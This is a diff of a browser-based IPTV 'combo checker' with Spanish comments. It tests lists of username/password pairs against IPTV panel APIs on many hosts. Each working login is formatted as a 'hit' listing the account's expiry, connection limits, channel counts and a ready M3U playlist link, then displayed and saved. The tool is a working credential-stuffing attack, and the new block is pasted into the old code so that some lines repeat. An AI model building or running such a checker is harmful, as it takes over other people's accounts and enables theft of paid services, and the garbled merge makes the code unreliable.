@@ -1,5 +1,4 @@
-Asi quedó 
-
+te estoy viendo recuerda soy kuaker 🫆💸
 
 
 <!DOCTYPE html>
@@ -252,13 +251,18 @@ Asi quedó
             padding-bottom: 3px;
         }
 
-        .hit-content {
-            white-space: pre-wrap;
-            color: #cfe9ff;
-            font-size: 0.9rem;
-            margin: 0;
-            font-family: monospace;
-        }
+       .hit-content {
+    font-family: monospace;
+    white-space: pre-wrap;
+    word-break: break-all;
+    color: #cfe9ff;
+    padding: 10px;
+    background: #000;
+    border: 1px solid #3a1f5c; /* Mantiene el borde que tenías antes */
+    border-radius: 8px;
+    font-size: 0.9rem;
+}
+
 
         .counter-badge {
             background-color: #311b92;
@@ -853,8 +857,55 @@ Asi quedó
                     const exp = data.user_info.exp_date ? new Date(data.user_info.exp_date*1000).toLocaleDateString() : 'Ilimitado';
                     
                     // --- FORMATO M3U ---
-                    const m3uLink = `http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
-                    const texto = `🔥 HIT ENCONTRADO 🔥\n🌐 Host: ${host}\n👤 Usuario: ${user}\n🔑 Pass: ${pass}\n⏳ Expira: ${exp}\n\n🔗 LISTA M3U:\n${m3uLink}`;
+                    // ... dentro de processarCombosJob ...
+try {
+    const url = `http://${host}/player_api.php?username=${encodeURIComponent(user)}&password=${encodeURIComponent(pass)}`;
+    const res = await fetchWithCors(url, { cache: 'no-store' });
+    const data = await res.json();
+    
+    if(data && data.user_info && (data.user_info.status === 'Active' || data.user_info.auth == 1)) {
+        
+        // --- SONIDO ---
+        if(document.getElementById('soundToggle').checked) {
+            audioHit.play().catch(e => console.log("Sonido bloqueado"));
+        }
+
+        // --- PEGA AQUÍ TU NUEVO CÓDIGO ---
+        const info = data.user_info;
+        const expDate = info.exp_date ? new Date(info.exp_date * 1000).toLocaleString('sv-SE') : 'Ilimitado';
+
+        const texto = `Host ➤ http://${host}
+├── Dominio ➤ http://${host.split(':')[0]}
+├── User ➤ ${user}
+├── Pass ➤ ${pass}
+├── Exp. ➤ ${expDate}
+├── Act Con ➤ ${info.active_cons || 0}
+├── Max Con ➤ ${info.max_connections || "N/A"}
+├── Status ➤ ${info.status}
+╰─➤Zona➤ ${info.timezone || "N/A"}
+
+╭─➤Chanel info
+├  🎩CANALES EN VIVO ➤ ${data.available_channels ? data.available_channels.length : "N/A"}
+├  🎩VIDEOS  Y  PELIS    ➤ ${data.movies_count || 0}
+├  🎩SERIES VARIADAS  ➤ ${data.series_count || 0}
+╰─➤    
+╭─➤🄼➂🅄 
+├  http://${host}/get.php?username=${user}&password=${pass}&type=m3u_plus`;
+        
+        // --- FIN DEL CÓDIGO NUEVO ---
+
+        HITS[jobId].push({ user, pass, texto });
+        countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
+        
+        const div = document.createElement('div');
+        div.className = 'hit-block';
+        // Ajustamos los estilos para que se vea bien el formato arbolito
+        div.innerHTML = `<pre class="hit-content" style="white-space: pre-wrap; word-break: break-all; font-family: monospace;">${texto}</pre>`;
+        hitsContainer.prepend(div);
+        guardarHitEnBanco(texto, user, pass);
+    }
+} catch(_){}
+
                     
                     HITS[jobId].push({ user, pass, texto });
                     countSpan.innerHTML = `Hits: <span class="yellow-hit">${HITS[jobId].length}</span>`;
